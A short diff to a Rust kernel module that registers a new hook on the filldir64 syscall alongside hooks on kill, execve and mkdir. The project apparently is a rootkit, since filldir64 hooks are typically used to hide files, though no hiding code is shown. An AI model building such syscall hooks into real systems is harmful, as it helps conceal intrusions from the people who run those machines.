@@ -12,6 +12,7 @@
 mod sys_execve;
 mod sys_kill;
 mod sys_mkdir;
+mod sys_filldir64;
 
 use kernel::bindings::pt_regs;
 use kernel::{bindings, prelude::*};
@@ -133,4 +134,5 @@ pub(crate) fn hook_syscalls() {
     sys_kill::sys_hook();
     sys_execve::sys_hook();
     sys_mkdir::sys_hook();
+    sys_filldir64::sys_hook();
 }
